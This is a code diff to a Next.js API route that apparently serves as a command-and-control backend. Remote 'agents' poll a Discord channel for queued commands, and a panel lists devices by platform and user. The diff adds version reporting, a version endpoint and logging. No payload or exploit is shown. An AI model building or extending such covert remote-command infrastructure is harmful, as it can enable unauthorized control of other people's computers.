@@ -21,6 +21,7 @@ interface DeviceStatus {
   platform: string;
   os_type: string;
   user: string;
+  version: string;
   last_seen: number;
 }
 
@@ -32,11 +33,20 @@ interface CommandResult {
   timestamp: number;
 }
 
-// 1. GET: Dipanggil Agent (Polling Command) ATAU Frontend (Fetch Devices)
 export async function GET(req: NextRequest) {
   const { searchParams } = new URL(req.url);
   const deviceId = searchParams.get("deviceId");
   const action = searchParams.get("action");
+
+  if (!GHOST_CHANNEL_ID) {
+    console.error(
+      "❌ [CONFIG ERROR] GHOST_CHANNEL_ID is not set in environment variables!",
+    );
+    return NextResponse.json(
+      { error: "Server Configuration Error" },
+      { status: 500 },
+    );
+  }
 
   // CASE A: Frontend minta daftar device
   if (action === "list_devices") {
@@ -90,11 +100,12 @@ export async function GET(req: NextRequest) {
   }
 
   // CASE C: Agent Polling Command (PENDING)
-  if (deviceId) {
+  if (deviceId && !action) {
     try {
-      // Ambil pesan terakhir
+      // console.log(`🛰️ [POLL] ${deviceId.substring(0,8)}... checking Discord`);
+      // Ambil pesan terakhir (naikkan limit jadi 10 agar lebih robust)
       const messages = await discord.get<any[]>(
-        `/channels/${GHOST_CHANNEL_ID}/messages?limit=5`,
+        `/channels/${GHOST_CHANNEL_ID}/messages?limit=10`,
       );
       if (!messages) return NextResponse.json(null);
 
@@ -117,6 +128,7 @@ export async function GET(req: NextRequest) {
           content.target_id === deviceId &&
           content.status === "PENDING"
         ) {
+          console.log(`✅ [COMMAND] Dispatching ${content.cmd} to ${deviceId}`);
           return NextResponse.json({
             messageId: msg.id,
             command: content.cmd,
@@ -128,6 +140,14 @@ export async function GET(req: NextRequest) {
     } catch (error) {
       return NextResponse.json(null);
     }
+  }
+
+  // CASE D: Get Latest Version Info
+  if (action === "get_version") {
+    return NextResponse.json({
+      version: "2.4",
+      changelog: "Added auto-update and version checking features.",
+    });
   }
 
   return NextResponse.json({ error: "Invalid request" }, { status: 400 });
@@ -190,6 +210,9 @@ export async function POST(req: NextRequest) {
 
     // CASE C: Frontend Mengirim Command Baru
     if (body.action === "queue_command") {
+      console.log(
+        `📣 [UI] Queuing command '${body.command}' for device ${body.deviceId}`,
+      );
       const payload = {
         status: "PENDING",
         target_id: body.deviceId,
@@ -233,20 +256,20 @@ declare global {
   var _ghostCustomNames: Record<string, string> | undefined;
 }
 
-const getRegistry = (): Record<string, DeviceStatus> => {
+function getRegistry(): Record<string, DeviceStatus> {
   if (!global._ghostRegistry) global._ghostRegistry = {};
   return global._ghostRegistry;
-};
+}
 
-const getResultRegistry = (): Record<string, CommandResult> => {
+function getResultRegistry(): Record<string, CommandResult> {
   if (!global._ghostResults) global._ghostResults = {};
   return global._ghostResults;
-};
+}
 
-const getCustomNames = (): Record<string, string> => {
+function getCustomNames(): Record<string, string> {
   if (!global._ghostCustomNames) global._ghostCustomNames = {};
   return global._ghostCustomNames;
-};
+}
 
 async function getDeviceRegistry() {
   const cache = getRegistry();
@@ -275,6 +298,7 @@ async function updateDeviceRegistry(data: any) {
     platform: data.platform,
     os_type: data.os_type || "Unknown",
     user: data.user,
+    version: data.version || "Unknown",
     last_seen: Date.now(),
   };
 }
